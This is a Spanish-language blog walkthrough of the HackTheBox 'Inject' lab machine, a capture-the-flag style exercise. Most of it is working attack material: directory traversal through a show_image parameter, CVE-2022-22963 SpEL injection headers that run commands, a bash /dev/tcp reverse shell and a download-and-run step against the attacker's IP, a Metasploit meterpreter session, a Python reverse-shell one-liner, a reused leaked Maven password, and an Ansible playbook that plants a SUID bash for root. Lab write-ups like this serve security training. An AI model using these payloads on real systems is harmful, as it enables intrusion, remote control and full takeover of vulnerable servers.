---
title: "HTB Inject"
date: 2025-10-17 09:35:00 +0000
categories: [hackthebox, machine, writeup, Linux]
tags: [linux, hackthebox, writeup, easy, directory transversal, Ansible playbook, spring, SpEL injection,
command injection]
image: /assets/img/posts//htb/inject/InjectLogo.png
pin: false
---

Les explicaré cómo compremeter la máquina [Inject](https://app.hackthebox.com/machines/533) de HackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de tipo `Directory Transversal`, usando dicha vulnerabilidad veremos una version vulnerable de Spring que cuenta con una vulnerabilidad de tipo `command injection`. Para migrar de usuario nos aprovecharemos de una contraseña filtrada. Y para escalar nuestros privilegios usaremos un archivo `Ansibe playbook`.

## Identificando el OS
Enviando trazas **ICMP** `(Internet Control Message Protocol)` y usando el **TTL**`(Time to Live)` podemos identificar el OS.

```bash
❯ ping -c1 10.129.178.241
PING 10.129.178.241 (10.129.178.241) 56(84) bytes of data.
64 bytes from 10.129.178.241: icmp_seq=1 ttl=63 time=214 ms

--- 10.129.178.241 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 214.029/214.029/214.029/0.000 ms
```
Vemos lo siguiente:

* TTL
  * El TTL es 63, esto indica que es una máquina Linux, ya que dichas mæquinas cuentan con un TTL igual a 64, pero…..porqué aparece como 63 e infiero que es Linux. bueno nuestra conexión no es directa, pasa por un nodo intermedario y eso hace que el TTL disminuya en una unidad.

## Analizando la WEB

![Web Error]({{ 'assets/img/posts/htb/inject/error.png' | relative_url }}){: .center-image }
_Web Error_
Si entramos veremos un mensaje de que no se puede acceder, así que sabemos que el puerto HTTP está corriendo en otro puerto, realizamos un escaneo NMAP.

## Escaneo NMAP

Realizaremos el escaneo para saber que purtos están abierto y además para ver por donde corre el HTTP.

```
❯ nmap 10.129.178.241
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 12:33 -04
Nmap scan report for 10.129.178.241
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
```

Corre por el puerto 8080, ahora podemos ver la web correctamente.

![Web Error]({{ 'assets/img/posts/htb/inject/web.png' | relative_url }}){: .center-image }
_Web Error_

## Detectando posibles métodos de intrución
Vemos un Login, lo cual podemos crear una cuanta y probar cosas pero no existe dicho archivo y vemos un **Sing Up** podemos probar injeciones SQL y NoSQL pero nos redirige a una página que nos indica que esta en construcción.
## Enumerando Directorios

Usando **WFUZZ** veremos algunos directorios importantes
```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.178.241:8080/FUZZ 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.178.241:8080/FUZZ
Total requests: 220547

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000153:   200        112 L    326 W      5371 Ch     "blogs"                                                                                                                
000000051:   200        103 L    194 W      5654 Ch     "register"                                                                                                             
000000352:   200        53 L     107 W      1857 Ch     "upload"                                                                                                               
000001097:   500        0 L      27 W       712 Ch      "environment"                                                                                                          
000002694:   500        0 L      3 W        106 Ch      "error"                                                                                                                
000008675:   200        33 L     77 W       1086 Ch     "release_notes"                                                                                                        
000022957:   400        0 L      32 W       431 Ch      "http%3A%2F%2Fwww"                                                                                                     
000045226:   200        165 L    487 W      6657 Ch     "http://10.129.178.241:8080/"                                                                                          
^C
Total time: 267.0736
Processed Requests: 48259
Filtered Requests: 48251
Requests/sec.: 180.6954

```
La carpera **/upload** nos llama la atención, ingresamos a ella y podemos ver que nos dejan subir archivos
![Upload]({{ 'assets/img/posts/htb/inject/up.png' | relative_url }}){: .center-image }
_Upload_

Si subimos una reverse shell de PHP nos dice que solo adminte imagenes, subimos una imagen random y miremos resultados.
![Imagen]({{ 'assets/img/posts/htb/inject/up1.png' | relative_url }}){: .center-image }
_Imagen_

entramos a ver la imagen y .....mmmm  **img?=** eso huele a **Directory Transversal**. Podemos probar ver el **/etc/passwd** ingresamos la cadena 

![Searchsploit]({{ 'assets/img/posts/htb/inject/dt.png' | relative_url }}){: .center-image }
_Directory Transversal_
```
../../../../../../../../../../../../../../../../etc/passwd
```
Pero no vemos nada, podemos probar con burp o curl, interceptamos la petición y la mandamos al repeater.
![Burpsuite]({{ 'assets/img/posts/htb/inject/burp.png' | relative_url }}){: .center-image }
_Burpsuite_
Analizando mas a fondo la web  podemos intentar listar la carppeta donde se guardan las paginas web **/var/www/**
```bash
❯ curl 'http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/'
html
WebApp
```
la careta **WebApp** nos llama la atención podemos listar su contenido
```bash
❯ curl 'http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/WebApp'
.classpath
.DS_Store
.idea
.project
.settings
HELP.md
mvnw
mvnw.cmd
pom.xml
src
target
```
Un archivo .xml, lo leemos.
```
❯ curl 'http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/WebApp/pom.xml'
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
		<dependency>
  			<groupId>com.sun.activation</groupId>
  			<artifactId>javax.activation</artifactId>
  			<version>1.2.0</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-thymeleaf</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>

		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugin>
		<finalName>spring-webapp</finalName>
	</build>

</project>
```
Viendo algunas versiones nos encontranos con **Spring Cloud Function Web**, buscando CVE nos encontramos que es vulnerable a SpEL injection.

## Explotación

### Explotación manual

Si buscamos `CVE` relacionadas vemos este [articulo](https://sysdig.com/blog/cve-2022-22963-spring-cloud/)  y este repo de [github](https://github.com/me2nuk/CVE-2022-22963) le pasamos mediante una petición `curl` y con un argumento de java intentamos ejecutar código remoto.


```bash
❯ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.11.204:8080...
* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)
> POST /functionRouter HTTP/1.1
> Host: 10.10.11.204:8080
> User-Agent: curl/7.88.1
> Accept: */*
> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")
> Content-Length: 4
> Content-Type: application/x-www-form-urlencoded
> 
< HTTP/1.1 500 
< Content-Type: application/json
< Transfer-Encoding: chunked
< Date: Tue, 04 Apr 2023 19:13:59 GMT
< Connection: close
< 
* Closing connection 0
{"timestamp":"2023-04-04T19:13:59.853+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java
```
Si comprobamos , notamos que se creo el archvo.

```bash
❯ curl 'http://10.10.11.204:8080/show_image?img=.././../../../../../././../../../../../tmp'
.font-unix
.ICE-unix
.Test-unix
.X11-unix
.XIM-unix
hsperfdata_frank
pwned
sKlBs
systemd-private-ba772bbc011b4fcb873f3ed2eefd0cc5-ModemManager.service-KPpmah
systemd-private-ba772bbc011b4fcb873f3ed2eefd0cc5-systemd-logind.service-akTACh
systemd-private-ba772bbc011b4fcb873f3ed2eefd0cc5-systemd-resolved.service-Dxeleh
systemd-private-ba772bbc011b4fcb873f3ed2eefd0cc5-systemd-timesyncd.service-6fJWPg
tomcat.8080.13169043535093016834
tomcat-docbase.8080.5822812062628089578
vmware-root_741-4248811580
YbRuN.b64
```
Creamos una reverse shell.
```bash
❯ cat pwned.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.83/443 0>&1
```
Nos creamos un servidor python
```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
En otra terminal nos ponemos en escucha.
```bash
❯ nc -lvnp 443
listening on [any] 443 ...
```
Subismos el archivo
```bash
❯ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget http://10.10.14.83/pwned.sh -o /tmp/pwned.sh")' --data-raw 'data' -v
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.11.204:8080...
* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)
> POST /functionRouter HTTP/1.1
> Host: 10.10.11.204:8080
> User-Agent: curl/7.88.1
> Accept: */*
> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl http://10.10.14.83/pwned.sh -o /tmp/pwned.sh")
> Content-Length: 4
> Content-Type: application/x-www-form-urlencoded
> 
< HTTP/1.1 500 
< Content-Type: application/json
< Transfer-Encoding: chunked
< Date: Tue, 04 Apr 2023 19:24:40 GMT
< Connection: close
< 
* Closing connection 0
{"timestamp":"2023-04-04T19:24:40.750+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}#   

```
Le damos permiso 

```bash
❯ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("chmod +x /tmp/pwned.sh")' --data-raw 'data' -v
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.11.204:8080...
* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)
> POST /functionRouter HTTP/1.1
> Host: 10.10.11.204:8080
> User-Agent: curl/7.88.1
> Accept: */*
> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("chmod +x /tmp/pwned.sh")
> Content-Length: 4
> Content-Type: application/x-www-form-urlencoded
> 
< HTTP/1.1 500 
< Content-Type: application/json
< Transfer-Encoding: chunked
< Date: Tue, 04 Apr 2023 19:26:55 GMT
< Connection: close
< 
* Closing connection 0
{"timestamp":"2023-04-04T19:26:55.630+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}#                                                                                                                                                
```
Lo ejecutamos
```bash
❯ curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/pwned.sh")' --data-raw 'data' -v
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.10.11.204:8080...
* Connected to 10.10.11.204 (10.10.11.204) port 8080 (#0)
> POST /functionRouter HTTP/1.1
> Host: 10.10.11.204:8080
> User-Agent: curl/7.88.1
> Accept: */*
> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/pwned.sh")
> Content-Length: 4
> Content-Type: application/x-www-form-urlencoded
> 
< HTTP/1.1 500 
< Content-Type: application/json
< Transfer-Encoding: chunked
< Date: Tue, 04 Apr 2023 19:33:45 GMT
< Connection: close
< 
* Closing connection 0
{"timestamp":"2023-04-04T19:33:45.482+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}#                                                                                                                                                

```

Nos llega la shell.

```
❯ nc -lvnp 443
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.83] from (UNKNOWN) [10.10.11.204] 34776
bash: cannot set terminal process group (815): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ 
```


### Explotación con MetaSploit

Nos abrimos metasploit

```
msfconsole
```
Usando de apoyo este [foro](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/spring_cloud_function_spel_injection) nos guiaremos. Una vez dentro de metasploit  haremos lo siguiente.

```
[msf](Jobs:0 Agents:0) >> use exploit/multi/http/spring_cloud_function_spel_injection
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) >> set RHOST 10.129.178.241
RHOST => 10.129.178.241
[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) >> set LHOST 10.10.14.170
LHOST => 10.10.14.170
[msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) >> run

[*] Started reverse TCP handler on 10.10.14.170:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
[*] Command Stager progress - 100.00% done (823/823 bytes)
[*] Sending stage (3045348 bytes) to 10.129.178.241
[*] Meterpreter session 1 opened (10.10.14.170:4444 -> 10.129.178.241:43644) at 2023-03-12 21:25:11 -0400

(Meterpreter 1)(/) > shell
Process 76003 created.
Channel 1 created.
whoami && id
frank
uid=1000(frank) gid=1000(frank) groups=1000(frank)
```
Ahora para mayor comodidad nos pasaremos esa shell mediante reverse shell, comprobamos si esta python3 y efectivamente esta instalado.

```python
export RHOST="10.10.14.170";export RPORT=443;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```
En nuestra máquina nos ponemos en escucha por el puerto 443 y nos debe llegar.

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.170] from (UNKNOWN) [10.129.178.241] 48474
frank@inject:/$
```
Aplicamos tratamiento a la [TTY](https://h4ckerlite.github.io/posts/tty/).

## Migración de usuario
En la carpeta personal del usuario listamos carpetas escondidad

```bash
frank@inject:~$ ls -a
.  ..  .bash_history  .bashrc  .cache  .local  .m2  .profile
frank@inject:~$ 
```
la carpeta **.m2** nos llama la atención, listamos su contenido


```bash
frank@inject:~$ ls .m2
settings.xml
frank@inject:~$ cat .m2/*
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
frank@inject:~$ 

```

Vemos la contraseña del usuario **phil**, migramos...

```bash
frank@inject:~$ su phil
Password:DocPhillovestoInject123 
phil@inject:/home/frank$ 
```


...en su carpeta personal procedemos a leer la primera flag.

```bash
phil@inject:~$ cat user.txt 
be****************************36
phil@inject:~$ 

```
## Escalada de Privilegios
No encontramos ningún binario SUID o permiso sudo, pero si si vemos a los grupos que pertenecemos vemos un grupo extraño **staff**.
```bash
phil@inject:~$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
phil@inject:~$ 
```
Si listamos si tenemos capacidad para dicho grupo nos encontramos con estó.
```bash
phil@inject:~$ find / -group staff -print 2>/dev/null
/opt/automation/tasks
/root
/var/local
```
La ruta **/opt/automation/tasks** nos llama la atención.

```bash
phil@inject:~$ ls /opt/automation/tasks/
playbook_1.yml
phil@inject:~$
```
Si miramos el archivo se modificó recientemente, por lo cual puede que exista una tarea cron.Si volvemos a volver a checkear el archivo se modifico 2 minutos después.
```bash
phil@inject:/opt/automation/tasks$ ls -lah
total 12K
drwxrwxr-x 2 root staff 4.0K Mar 13 01:46 .
drwxr-xr-x 3 root root  4.0K Oct 20 04:23 ..
-rw-r--r-- 1 root root   150 Mar 13 01:46 playbook_1.yml
phil@inject:/opt/automation/tasks$
```
Un archivo .YML buscamos en internet el nombre del arvhivo "playbook". Buscando en internet nos encotramos con este [blog](https://iamnasef.com/projects/ansible-privilege-escalation/) que nos lleva a un archivo de [github](https://github.com/iamnasef/ansible-privilege-escalation/blob/main/shell.yml). Creamos un archivo shell.yml con el siguiente contenido.

Esto copiara la bash en la carpeta actual y la convertirá en SUID y podemos spawnear una shell como root.
```bash
---                                                                                                               
- name: shell                                                                                                  
  hosts: localhost
  become: yes

  tasks:
  - name: hack
    shell: "cp /bin/bash . && chmod +sx bash"
```
Una vez pasado los 2 minutos spawneamos la shell como root con:
```bash
/usr/bin/ansible-playbook shell.yml
./bash -p
```
Hurra!!!! somos root, procedemos a leer la flag del usuario root
```bash
bash-5.0# cat root.txt
4e****************************67
bash-5.0# 
```

Máquina Pwneada.


